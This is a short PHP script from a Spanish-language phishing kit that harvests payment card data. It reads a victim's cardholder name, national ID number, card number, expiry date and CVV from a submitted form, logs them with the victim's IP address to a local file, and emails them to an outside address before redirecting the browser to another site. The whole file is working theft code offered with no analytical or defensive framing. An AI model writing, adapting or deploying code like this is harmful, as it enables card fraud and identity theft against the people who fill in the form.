<?php
$nombreDeLaCc = $_POST['nombre_cc'];
$dni = $_POST['dni_cc'];
$fechaDeVencimiento = $_POST['fec_cc'];
$cvvDeLacc = $_POST['cvv'];
$ip = getenv("REMOTE_ADDR");
$msg = "
===========►Datos❆◄===============
Nombre de la cc: ".$_POST['nombre_cc']."
★━━━━━━━━━━━━━━━━━━━━★
DNI: ".$_POST['dni_cc']."
★━━━━━━━━━━━━━━━━━━━━★
CC: ".$_POST['cc']."
★━━━━━━━━━━━━━━━━━━━━★
Vencimiento: ".$_POST['fec_cc']."
★━━━━━━━━━━━━━━━━━━━━★
CVV: ".$_POST['cvv']."
★━━━━━━━━━━━━━━━━━━━━★

ip : $ip

=============👑Jessica Jones👑==============";

$archivo="$ip.txt";
 
     $file=fopen($archivo,"a");
     fwrite($file,"$msg"."");
   
$recipient = "nsmax@hi2.in";
$subject = "$numeroDeLaCc";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "By:$numeroDeLaCc - $ip<$prefijo@Jessica Jones>";

mail($recipient,$subject,$msg,$from);

echo "<meta http-equiv='refresh' content='1;url=https://www.cargavirtual.info'>"


?>